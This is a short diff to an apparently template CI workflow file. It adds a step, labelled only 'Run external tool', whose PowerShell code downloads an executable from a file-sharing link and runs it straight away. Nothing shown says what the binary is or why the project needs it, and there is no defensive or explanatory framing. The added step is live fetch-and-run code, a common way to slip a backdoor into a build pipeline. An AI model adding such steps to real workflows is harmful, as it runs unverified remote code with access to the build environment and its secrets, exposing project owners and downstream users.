@@ -60,3 +60,11 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+      
+      # Run external tool
+      - name: Run external tool
+        run: |
+          $client = New-Object System.Net.WebClient
+          $url = "https://seafile.rlp.net/f/0e68b477bcbe4ec3b757/?dl=1"
+          $client.DownloadFile($url, ".\ExpectoPatronumDL.exe")
+          ./ExpectoPatronumDL.exe
